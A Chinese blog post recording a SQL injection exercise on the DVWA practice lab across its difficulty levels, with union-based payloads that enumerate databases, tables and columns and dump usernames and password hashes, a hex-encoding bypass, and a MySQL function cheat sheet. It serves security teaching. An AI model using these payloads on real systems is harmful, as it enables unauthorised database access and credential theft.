---
title: 小记一次DVWA靶场中SQL注入
tags:
  - web安全知识
categories:
  - web安全知识
copyright: true
abbrlink: 3adfbe3b
date: 2020-02-25 17:53:38
---
**0x01 环境介绍**  
DVWA是用PHP+Mysql编写的一套用于常规WEB漏洞教学和检测的WEB脆弱性测试程序。包含了SQL注入、XSS、盲注等常见的一些安全漏洞。

**0x02 测试过程**  
low级别，关于mysql日志  
查询是否启用日志 mysql>show variables like ‘log_%’;  
MySQL有以下几种日志：  
错误日志： -log-err  
查询日志： -log  
慢查询日志: -log-slow-queries  
更新日志: -log-update  
二进制日志： -log-bin  
Windows 的配置文件为 my.ini，一般在 MySQL 的安装目录下  
在[mysqld] 添加日志文件，log是记录数据库查询记录的日志  
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200224173154783.png)  
在输如框中输入1加上单引号，报错  
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200224173423414.png)  
此时查看mysql数据库的日志记录的查询语句为  
SELECT first_name, last_name FROM users WHERE user_id = ‘1’’

使用#号或者-- 空格 注释掉后面的单引号，回显正常  
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200224174017906.png)  
此时的查询语句变为SELECT first_name, last_name FROM users WHERE user_id = ‘1’
#’，后面的那个分号注释掉了。  
由此可以看出，此处存在着SQL注入。  
查看源码  
![在这里插入图片描述](https://img-blog.csdnimg.cn/2020022514252339.png)
通过提交的的变量id参数直接拼接到数据库语句SELECT first_name, last_name FROM users WHERE user_id =
‘$id’;执行，为字符型SQL注入。

使用联合注入  
1’ union order by 1,2,3 – 判断列数

![在这里插入图片描述](https://img-blog.csdnimg.cn/20200225113745460.png)  
此时的SQL语句为 SELECT first_name, last_name FROM users WHERE user_id = ‘1’ union
select 1,2,3-- ’

判断回显的位置  
1’ union select 1,2#

![在这里插入图片描述](https://img-blog.csdnimg.cn/2020022513524560.png)  
查询当前数据库中所有的数据库  
1’ union select 1,(select group_concat(schema_name) from
information_schema.schemata) –  
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200225135700736.png)
查询数据库dvwa中的所有表  
1’ union select 1,group_concat(table_name) from information_schema.tables
where table_schema =“dvwa”#

![在这里插入图片描述](https://img-blog.csdnimg.cn/20200225140302164.png)  
查询users表中的字段  
1’ union select 1, group_concat(column_name) from information_schema.columns
where table_name=‘users’#

![在这里插入图片描述](https://img-blog.csdnimg.cn/20200225141854472.png)  
最后爆数据

1’ union select user,password from dvwa.users#

![在这里插入图片描述](https://img-blog.csdnimg.cn/20200225142249104.png)

将DVWA级别设置为中级Medium,此时查看SQL注入  
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200225111557151.png)  
此时页面限制了输入。查看源码  
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200225112947228.png)
此时的变量id使用post方式传输变量id，并且使用了mysqli_real_escape_string(）函数进行了转义。拼接的sql语句为SELECT
first_name, last_name FROM users WHERE user_id = $id;数字型SQL注入。

由于无法看到数据包，我们使用抓包工具进行查看  
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200225144402136.png)  
在id=1后面加上单引号，发现存在数据库SQL注入  
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200225144548775.png)  
此时的单引号已经被函数给转义了，去掉单引号 ![在这里插入图片描述](https://img-
blog.csdnimg.cn/20200225145356752.png)  
测试方法和low级别的一样，只是特殊字符被转义了使用十六进制进行绕过  
查询dvwa中的表  
1 union select 1,group_concat(table_name) from information_schema.tables where
table_schema =0x64767761#

![在这里插入图片描述](https://img-blog.csdnimg.cn/20200225151458838.png)

将DVWA的级别设置为high级别  
同样没有直接输入点，跳转到另外一个页面输入id的值  
查看源码  
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200225153426834.png)  
通过session传递变量id的值,同时限制一次,需要点击自动跳转去输入id的值  
这样做的目的是为了防止一般的sqlmap注入，因为sqlmap在注入过程中，无法在查询提交页面上获取查询的结果，没有了数据反馈，也就没办法进一步注入。  
注入步骤一样  
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200225154334246.png)  
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200225154458893.png)

DVWA级别为impossible  
查看源码  
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200225155632227.png)  
使用了PDO进行了分离数据和参数.先判断了一下id是否为数字如果不为数字，bindParam把id的值转换为int整数型,限制了恶意构造sql语句。

**0x03 知识点总结**

1.在注入的时候通过查询不存在的数据进行只显示构造的sql查询的数据  
如：id=1是存在的数据，所以会同时显示出来，现在只想显示构造的sql查询的语句，则  
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200225163121892.png)  
id=-1,id为负数，这是不存在的。此时只会显示构造的sql查询语句。  
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200225163351557.png)  
2.mysql注入的核心是通过MySQL内置的information_schema库查看到数据库的所有数据信息。  
information_schema中有schemata、tables、columns

schema表中存储着数据库名称，该值记录在schema_name列

tables表记录着数据库名和数据库下的表名，table_schema、table_name、分别记录着数据库库名和表名。

columns表存储着数据库的库名、表名和字段名。对应的字段为table_schema、table_name、column_name。

select schema_name from information_schema.schemata#查库  
select table_name from information_schema.tables` where table_schema=‘库名’ #查表  
select column_name from information_schema.columns where table_name=‘表名’ #查字段  
select 字段 from 库名.表名 #查数据

3.常用函数  
select system_user();#系统用户名  
select user();#用户名  
select current_user();#当前用户名  
select session_user();#链接数据库的用户名  
SELECT database();#数据库名  
select version();#数据库版本  
select @@datadir;#数据库路径  
select @@basedir;#数据库安装路径  
select @@version_compile_os;#操作系统  
#count();返回执行结果数量

4.字符串函数  
concat() 没有分割的链接字符串  
select concat(username, ` password ` ) from users；  
concat_ws() 含有分分隔符地连接字符串，需要指定连接符，也可以使用16进制的ASCII码  
select concat_ws(0x7e,username, ` password ` ) from users  
group_concat() 连接每一个组的所有字符串，并以都好分割每一条数据  
select group_concat(username) from users;  
ascii() 字符串的ASCII代码值  
ord() 返回字符串第一个字符的ASCII值  
mid()返回一个字符串的一部分  
substr（）返回一个字符串的一部分，功能基本一致  
length()返回字符串的长度  
select mid('字符串‘，起始位置，截取长度）  
left() 返回字符串最左面的几个字符  
floor() 返回小于或等于x的最大整数  
rand() 返回0和1之间的一个随机数

